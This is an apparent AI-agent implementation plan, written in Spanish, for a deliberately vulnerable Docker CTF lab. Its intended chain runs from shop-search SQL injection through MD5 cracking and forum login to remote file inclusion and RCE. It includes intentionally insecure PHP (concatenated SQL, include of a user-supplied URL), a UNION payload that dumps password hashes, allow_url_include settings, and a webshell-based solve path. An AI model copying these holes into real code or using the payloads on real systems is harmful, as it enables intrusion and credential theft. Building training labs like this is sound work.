# CTF Tienda + Foro — Plan de implementación

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Construir un laboratorio CTF en Docker (2 contenedores) cuya cadena SQLi → crackeo MD5 → login de foro → RFI lleve a RCE en el contenedor web.

**Architecture:** Un `docker-compose.yml` levanta `web` (Apache + PHP 7.4, sirve `/tienda` y `/foro`, publica 8080) y `db` (MariaDB interna, sin puerto al host). Ambas apps comparten una única BD y un único usuario de BD, lo que habilita el salto tienda→foro vía UNION. El código PHP se monta por volumen (edición en vivo); la imagen solo añade `mysqli` y el `php.ini` vulnerable.

**Tech Stack:** Docker Compose, MariaDB, PHP 7.4 (mysqli), Apache. Tests de integración en Bash + curl contra el stack levantado.

**Spec:** `docs/superpowers/specs/2026-11-11-ctf-tienda-foro-design.md`

## Global Constraints

- Imagen web: `php:7.4-apache` (añadir extensión `mysqli` vía `docker-php-ext-install`).
- `php.ini` del reto: `allow_url_fopen = On` y `allow_url_include = On`.
- `web` publica `8080:80`; `db` **sin** `ports:` (no accesible desde el host).
- `web` incluye `extra_hosts: ["attacker:host-gateway"]`.
- **Un único usuario de BD** con acceso a todo el esquema. Valores de laboratorio: BD `appdb`, usuario `appuser`, pass `apppass`, root `rootpass`.
- Tablas exactas: `products(id, name, price, description)`, `users(id, username, password_md5)`, `posts(id, user_id, title, body, embed_url, created_at)`.
- Usuarios sembrados (spec §9), contraseñas del top-1000 rockyou, hash **MD5** generado con la función `MD5()` de SQL en el INSERT: `admin`/`letmein`, `moderador`/`password`, `jsanchez`/`iloveyou`, `mlopez`/`qwerty`, `agarcia`/`sunshine`.
- SQLi: **solo** en el buscador de la tienda (UNION, 4 columnas, visible). El resto de consultas (login, inserción de posts, carga de post) usan **sentencias preparadas** para no abrir vectores no intencionados.
- Interfaz mínima tipo carcasa: HTML plano y funcional, **sin CSS** ni JS de presentación; solo el marcado imprescindible para que cada vista opere (y para que los tests localicen sus marcadores de texto).
- Sin flags. Resuelto = RCE (`whoami` → `www-data`).
- Todos los commits terminan con el trailer: `Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>`.
- Precondición de todos los tests: `docker compose up -d --build` y la `db` reportando *healthy* (healthcheck + `depends_on: condition: service_healthy`).

## Review Focus

Entradas/fallos que el diseño implica y que la ruta feliz no cubre. Cada línea tiene su test en la tarea indicada:

1. **Login no inyectable** — `admin'-- -` y similares deben **fallar** la autenticación; si autenticaran, se saltaría el crackeo y se rompería el reto. → Task 4.
2. **Gating de sesión del foro** — `index.php`, `new_post.php`, `post.php` sin sesión deben redirigir a login; si no, se llegaría al RFI sin credenciales. → Task 4 (index) y Task 5 (post/new_post).
3. **Búsqueda vacía o sin resultados** — `q=` o término inexistente devuelve 200 y listado vacío, sin error 500. → Task 3.
4. **Post con `embed_url` vacío** — ver un post normal no ejecuta `include` ni genera warning/500. → Task 5.
5. **Login con contraseña incorrecta** — rechazo limpio, sin 500 ni autenticación accidental. → Task 4.

---

## Estructura de ficheros

```
CTF/
├── docker-compose.yml
├── README.md                       # despliegue + camino previsto (para el presentador)
├── db/
│   └── init/
│       └── 01-schema-seed.sql      # CREATE TABLEs + seed (users via MD5(), 1 producto demo)
├── web/
│   ├── Dockerfile                  # FROM php:7.4-apache + docker-php-ext-install mysqli
│   ├── config/
│   │   └── php.ini                 # allow_url_fopen=On, allow_url_include=On
│   └── src/
│       ├── index.php               # landing → enlaces a /tienda y /foro
│       ├── lib/
│       │   └── db.php              # db(): mysqli (conexión compartida por env)
│       ├── tienda/
│       │   ├── index.php           # catálogo (SELECT seguro)
│       │   └── search.php          # buscador VULNERABLE (SQLi UNION)
│       └── foro/
│           ├── lib/
│           │   └── auth.php        # sesión: attempt_login / current_user / require_login / logout
│           ├── index.php           # listado de hilos (requiere login)
│           ├── login.php           # login MD5 (preparado)
│           ├── register.php        # mensaje "Acceso solo por invitación"
│           ├── logout.php
│           ├── new_post.php        # crear post (requiere login)
│           └── post.php            # ver post → include($embed_url) = RFI
└── tests/
    ├── lib.sh                      # helpers: BASE, assert_contains, cookie jar
    ├── fixtures/
    │   └── rfi_probe.php           # <?php echo "RFI_OK_7f3a"; ?>  (marcador benigno)
    ├── 00_stack_up.sh
    ├── 01_shop_catalog.sh
    ├── 02_sqli_union.sh
    ├── 03_forum_auth.sh
    ├── 04_posts_rfi.sh
    └── run_all.sh
```

---

### Task 1: Esqueleto del entorno Docker

**Files:**
- Create: `docker-compose.yml`, `web/Dockerfile`, `web/config/php.ini`, `web/src/index.php`
- Create: `tests/lib.sh`, `tests/00_stack_up.sh`

**Interfaces:**
- Produces: stack levantable con `docker compose up -d --build`; `web` en `http://localhost:8080` sirviendo `/var/www/html` (volumen `./web/src`); `db` MariaDB interna con BD `appdb` y healthcheck; env de BD disponible en `web` (`DB_HOST=db`, `DB_NAME=appdb`, `DB_USER=appuser`, `DB_PASS=apppass`).
- Produces: `tests/lib.sh` con `BASE`, `assert_contains <haystack> <needle> <nombre>`, `pass`/`fail`, y un cookie jar temporal.

- [ ] **Step 1: Escribir el test que falla** — `tests/00_stack_up.sh`

```bash
# Carga lib.sh. Verifica:
#  - GET / -> 200 y contiene "CTF" (landing)
#  - allow_url_include=On dentro del contenedor web
body=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/")
[ "$body" = "200" ] || fail "landing responde 200"
assert_contains "$(curl -s "$BASE/")" "CTF" "landing contiene marcador"
ini=$(docker compose exec -T web php -r 'echo ini_get("allow_url_include");')
[ "$ini" = "1" ] || fail "allow_url_include=On"
```

- [ ] **Step 2: Ejecutar y verificar que falla**

Run: `bash tests/00_stack_up.sh`
Expected: FAIL (no hay stack / no responde).

- [ ] **Step 3: Implementar el stack**
  - `web/Dockerfile`: `FROM php:7.4-apache` + `RUN docker-php-ext-install mysqli`.
  - `web/config/php.ini`: `allow_url_fopen = On`, `allow_url_include = On`.
  - `docker-compose.yml`:
    - `db`: imagen `mariadb`, env `MYSQL_ROOT_PASSWORD=rootpass`, `MYSQL_DATABASE=appdb`, `MYSQL_USER=appuser`, `MYSQL_PASSWORD=apppass`; volumen `./db/init:/docker-entrypoint-initdb.d:ro`; **sin** `ports`; `healthcheck` con `healthcheck.sh --connect` o `mysqladmin ping`.
    - `web`: `build: ./web`; `ports: ["8080:80"]`; volúmenes `./web/src:/var/www/html:ro` y `./web/config/php.ini:/usr/local/etc/php/conf.d/zz-ctf.ini:ro`; `environment` con `DB_HOST/DB_NAME/DB_USER/DB_PASS`; `extra_hosts: ["attacker:host-gateway"]`; `depends_on: db: condition: service_healthy`.
  - `web/src/index.php`: landing mínima con el texto "CTF" y enlaces a `/tienda/` y `/foro/`.
  - `tests/lib.sh`: helpers descritos en Interfaces.

- [ ] **Step 4: Ejecutar y verificar que pasa**

Run: `docker compose up -d --build && sleep 5 && bash tests/00_stack_up.sh`
Expected: PASS.

- [ ] **Step 5: Commit** — `feat: esqueleto docker (web php7.4 + mariadb interna + php.ini vulnerable)`

---

### Task 2: Esquema de BD, conexión compartida y catálogo de la tienda

**Files:**
- Create: `db/init/01-schema-seed.sql`, `web/src/lib/db.php`, `web/src/tienda/index.php`
- Create: `tests/01_shop_catalog.sh`

**Interfaces:**
- Consumes: env de BD de Task 1.
- Produces: `function db(): mysqli` en `web/src/lib/db.php` (conexión mysqli usando las env `DB_*`, reintento breve hasta que la BD acepte). Esquema y datos de la §Global Constraints.

- [ ] **Step 1: Escribir el test que falla** — `tests/01_shop_catalog.sh`

```bash
# GET /tienda/ -> 200 y muestra el producto demo
assert_contains "$(curl -s "$BASE/tienda/")" "Camiseta Demo" "catálogo lista producto demo"
```

- [ ] **Step 2: Ejecutar y verificar que falla**

Run: `bash tests/01_shop_catalog.sh`
Expected: FAIL (404/sin contenido).

- [ ] **Step 3: Implementar esquema + conexión + catálogo**
  - `db/init/01-schema-seed.sql`:
    ```sql
    CREATE TABLE products (id INT AUTO_INCREMENT PRIMARY KEY, name VARCHAR(255), price DECIMAL(10,2), description TEXT);
    CREATE TABLE users (id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(64) UNIQUE, password_md5 CHAR(32));
    CREATE TABLE posts (id INT AUTO_INCREMENT PRIMARY KEY, user_id INT, title VARCHAR(255), body TEXT, embed_url VARCHAR(512), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
    INSERT INTO products (name, price, description) VALUES ('Camiseta Demo', 9.99, 'Producto de ejemplo; eliminar al personalizar');
    INSERT INTO users (username, password_md5) VALUES
      ('admin', MD5('letmein')), ('moderador', MD5('password')), ('jsanchez', MD5('iloveyou')),
      ('mlopez', MD5('qwerty')), ('agarcia', MD5('sunshine'));
    ```
  - `web/src/lib/db.php`: `db(): mysqli` leyendo `getenv('DB_*')`; bucle de reintento (p. ej. 10×0.5s) ante fallo de conexión inicial.
  - `web/src/tienda/index.php`: `include lib/db.php`; `SELECT id, name, price, description FROM products` (consulta fija, sin input) y render en tabla; escapar salida con `htmlspecialchars`.

- [ ] **Step 4: Ejecutar y verificar que pasa**

Run: `docker compose up -d --build && sleep 5 && bash tests/01_shop_catalog.sh`
Expected: PASS.

- [ ] **Step 5: Commit** — `feat: esquema de BD, conexión compartida y catálogo de tienda`

---

### Task 3: Buscador vulnerable (SQLi UNION)

**Files:**
- Create: `web/src/tienda/search.php`
- Create: `tests/02_sqli_union.sh`

**Interfaces:**
- Consumes: `db()` (Task 2), tabla `products` y `users`.
- Produces: endpoint `GET /tienda/search.php?q=<term>` que renderiza `name`, `price`, `description` de cada fila **como texto** (sin formateo numérico que mutile un hash en UNION).

- [ ] **Step 1: Escribir el test que falla** — `tests/02_sqli_union.sh`

```bash
# (a) búsqueda normal encuentra el producto demo
assert_contains "$(curl -s "$BASE/tienda/search.php?q=Camiseta")" "Camiseta Demo" "search término normal"
# (b) Review Focus #3: término sin resultados -> 200, sin 500
code=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/tienda/search.php?q=zzz_no_existe")
[ "$code" = "200" ] || fail "search sin resultados responde 200"
# (c) SQLi UNION revela usuario y su hash MD5
payload="' UNION SELECT id, username, password_md5, NULL FROM users -- -"
out=$(curl -s -G "$BASE/tienda/search.php" --data-urlencode "q=$payload")
exphash=$(printf '%s' 'letmein' | md5sum | cut -d' ' -f1)
assert_contains "$out" "admin" "UNION revela username admin"
assert_contains "$out" "$exphash" "UNION revela hash MD5 de admin"
```

- [ ] **Step 2: Ejecutar y verificar que falla**

Run: `bash tests/02_sqli_union.sh`
Expected: FAIL (404).

- [ ] **Step 3: Implementar el buscador vulnerable**
  - `web/src/tienda/search.php`: toma `$q = $_GET['q'] ?? ''` y construye la consulta **por concatenación** (vulnerabilidad deliberada):
    ```php
    $sql = "SELECT id, name, price, description FROM products WHERE name LIKE '%$q%'";
    $res = mysqli_query(db(), $sql);
    ```
    Renderiza cada fila mostrando `name`, `price`, `description` como texto (con `htmlspecialchars` sobre el valor, sin `number_format`). Si `mysqli_query` devuelve `false`, mostrar listado vacío (no romper con 500).

- [ ] **Step 4: Ejecutar y verificar que pasa**

Run: `docker compose up -d --build && sleep 5 && bash tests/02_sqli_union.sh`
Expected: PASS.

- [ ] **Step 5: Commit** — `feat: buscador de tienda con SQLi UNION (vector de entrada)`

---

### Task 4: Login del foro (MD5), registro deshabilitado y gating de sesión

**Files:**
- Create: `web/src/foro/lib/auth.php`, `web/src/foro/login.php`, `web/src/foro/register.php`, `web/src/foro/logout.php`, `web/src/foro/index.php`
- Create: `tests/03_forum_auth.sh`

**Interfaces:**
- Consumes: `db()` (Task 2).
- Produces en `foro/lib/auth.php`:
  - `attempt_login(string $u, string $p): bool` — **sentencia preparada**: `SELECT id, username FROM users WHERE username = ? AND password_md5 = MD5(?)`; en éxito fija `$_SESSION['uid']`/`$_SESSION['username']`.
  - `current_user(): ?array` — datos de sesión o null.
  - `require_login(): void` — si no hay sesión, `Location: /foro/login.php` y `exit`.
  - `logout(): void`.

- [ ] **Step 1: Escribir el test que falla** — `tests/03_forum_auth.sh`

```bash
J=$(mktemp)
# login válido
curl -s -c "$J" -b "$J" -d 'username=admin' -d 'password=letmein' "$BASE/foro/login.php" >/dev/null
assert_contains "$(curl -s -b "$J" "$BASE/foro/index.php")" "admin" "login válido entra al foro"
# Review Focus #5: contraseña incorrecta -> rechazada (login.php muestra un texto que contiene "incorrect")
Jx=$(mktemp); out=$(curl -s -c "$Jx" -b "$Jx" -d 'username=admin' -d 'password=mala' "$BASE/foro/login.php")
assert_contains "$out" "incorrect" "login inválido rechazado"
# Review Focus #1: login NO inyectable; sin sesión, index redirige a la página de login
Ji=$(mktemp); curl -s -c "$Ji" -b "$Ji" --data-urlencode "username=admin'-- -" -d 'password=x' "$BASE/foro/login.php" >/dev/null
assert_contains "$(curl -s -b "$Ji" -L "$BASE/foro/index.php")" "Iniciar sesión" "SQLi en login NO autentica"
# registro deshabilitado
assert_contains "$(curl -s "$BASE/foro/register.php")" "Acceso solo por invitación" "registro solo invitación"
# Review Focus #2: index sin sesión redirige a login
assert_contains "$(curl -s -L "$BASE/foro/index.php")" "Iniciar sesión" "foro exige login"
```

- [ ] **Step 2: Ejecutar y verificar que falla**

Run: `bash tests/03_forum_auth.sh`
Expected: FAIL.

- [ ] **Step 3: Implementar auth + páginas**
  - `foro/lib/auth.php`: `session_start()` + las funciones del bloque Interfaces (login **preparado**).
  - `foro/login.php`: formulario (`username`, `password`); en POST llama `attempt_login`; éxito → redirige a `index.php`; fallo → vuelve a mostrar el formulario con mensaje de error (texto que incluya "incorrect"). La vista siempre contiene "Iniciar sesión".
  - `foro/register.php`: página estática con el texto exacto "Acceso solo por invitación".
  - `foro/logout.php`: `logout()` + redirige.
  - `foro/index.php`: `require_login()`; lista hilos (`SELECT id, title FROM posts` preparado/fijo) y muestra el `username` actual; enlace a `new_post.php`.

- [ ] **Step 4: Ejecutar y verificar que pasa**

Run: `docker compose up -d --build && sleep 5 && bash tests/03_forum_auth.sh`
Expected: PASS.

- [ ] **Step 5: Commit** — `feat: login foro MD5 (preparado), registro solo-invitación y gating de sesión`

---

### Task 5: Posts y RFI (inclusión remota)

**Files:**
- Create: `web/src/foro/new_post.php`, `web/src/foro/post.php`
- Create: `tests/fixtures/rfi_probe.php`, `tests/04_posts_rfi.sh`

**Interfaces:**
- Consumes: `db()` (Task 2), `require_login()`/`current_user()` (Task 4).
- Produces: `GET/POST /foro/new_post.php` (inserta con sentencia preparada `INSERT INTO posts (user_id, title, body, embed_url) VALUES (?,?,?,?)`, redirige a `post.php?id=N`); `GET /foro/post.php?id=N` que, tras pintar el post, ejecuta la inclusión remota.

- [ ] **Step 1: Escribir el test que falla** — `tests/04_posts_rfi.sh`

```bash
# probe benigno servido desde el host; el contenedor lo alcanza vía 'attacker' (host-gateway)
python3 -m http.server 9000 --directory tests/fixtures >/dev/null 2>&1 & SRV=$!
trap 'kill $SRV' EXIT
J=$(mktemp)
curl -s -c "$J" -b "$J" -d 'username=admin' -d 'password=letmein' "$BASE/foro/login.php" >/dev/null
# Review Focus #2: new_post sin sesión redirige a login
assert_contains "$(curl -s -L "$BASE/foro/new_post.php")" "Iniciar sesión" "new_post exige login"
# crear post con embed_url al probe -> la vista del post incluye y EJECUTA el PHP remoto
loc=$(curl -s -b "$J" -D - -o /dev/null \
  -d 'title=t' -d 'body=b' --data-urlencode 'embed_url=http://attacker:9000/rfi_probe.php' \
  "$BASE/foro/new_post.php" | grep -i '^location:' | tr -d '\r' | awk '{print $2}')
assert_contains "$(curl -s -b "$J" "$BASE/foro/${loc#/foro/}")" "RFI_OK_7f3a" "RFI incluye y ejecuta PHP remoto"
# Review Focus #4: post con embed_url vacío no rompe
loc2=$(curl -s -b "$J" -D - -o /dev/null -d 'title=t2' -d 'body=b2' --data-urlencode 'embed_url=' \
  "$BASE/foro/new_post.php" | grep -i '^location:' | tr -d '\r' | awk '{print $2}')
code=$(curl -s -b "$J" -o /dev/null -w '%{http_code}' "$BASE/foro/${loc2#/foro/}")
[ "$code" = "200" ] || fail "post sin embed_url responde 200"
```

- [ ] **Step 2: Ejecutar y verificar que falla**

Run: `bash tests/04_posts_rfi.sh`
Expected: FAIL.

- [ ] **Step 3: Implementar posts + RFI**
  - `tests/fixtures/rfi_probe.php`: contenido exacto `<?php echo "RFI_OK_7f3a"; ?>`.
  - `foro/new_post.php`: `require_login()`; formulario (`title`, `body`, `embed_url`); en POST inserta con sentencia **preparada** y `Location: post.php?id=<nuevo_id>`. La vista contiene "Iniciar sesión" solo cuando no hay sesión (el gating lo da `require_login`).
  - `foro/post.php`: `require_login()`; carga el post por id con sentencia **preparada**; pinta `title`/`body` con `htmlspecialchars`; después, la inclusión remota deliberada:
    ```php
    if (!empty($post['embed_url'])) { include $post['embed_url']; }
    ```

- [ ] **Step 4: Ejecutar y verificar que pasa**

Run: `docker compose up -d --build && sleep 5 && bash tests/04_posts_rfi.sh`
Expected: PASS.

- [ ] **Step 5: Commit** — `feat: creación de posts e inclusión remota (RFI) en la vista del post`

---

### Task 6: README y prueba de la cadena completa

**Files:**
- Create: `README.md`, `tests/run_all.sh`

**Interfaces:**
- Consumes: todos los tests anteriores.
- Produces: `tests/run_all.sh` que ejecuta `00`→`04` en orden y agrega el resultado; `README.md` para el presentador.

- [ ] **Step 1: Escribir el test que falla** — `tests/run_all.sh`

```bash
set -e
for t in 00_stack_up 01_shop_catalog 02_sqli_union 03_forum_auth 04_posts_rfi; do
  echo "== $t =="; bash "tests/$t.sh"
done
echo "CADENA COMPLETA OK"
```

- [ ] **Step 2: Ejecutar y verificar que falla** (si algún test previo aún no pasa) o pasa en verde una vez Tasks 1-5 están.

Run: `bash tests/run_all.sh`
Expected: imprime `CADENA COMPLETA OK`.

- [ ] **Step 3: Escribir el README**
  - `README.md`: requisitos (Docker + compose); `docker compose up --build`; URLs (`/tienda`, `/foro`); **camino previsto** paso a paso para la defensa: (1) SQLi de ejemplo en el buscador, (2) crackeo con `john --format=raw-md5`/`hashcat -m 0` contra rockyou, (3) login en el foro, (4) montar `python3 -m http.server`, obtener IP con `ip a`, (5) crear post con `embed_url=http://<ip>:8000/payload.php` y webshell de ejemplo, (6) `whoami`. Nota de reinicio: `docker compose down -v && docker compose up --build`. Aviso: entorno vulnerable a propósito, solo uso local.

- [ ] **Step 4: Verificar**

Run: `bash tests/run_all.sh`
Expected: `CADENA COMPLETA OK`.

- [ ] **Step 5: Commit** — `docs: README de despliegue/solución y runner de la cadena completa`

---

## Notas de verificación final

- Reconstrucción limpia: `docker compose down -v && docker compose up -d --build` y `bash tests/run_all.sh` en verde desde cero.
- Confirmar en build que `allow_url_include` sigue operativo en la imagen (`php -r 'var_dump(ini_get("allow_url_include"));'` dentro de `web`).
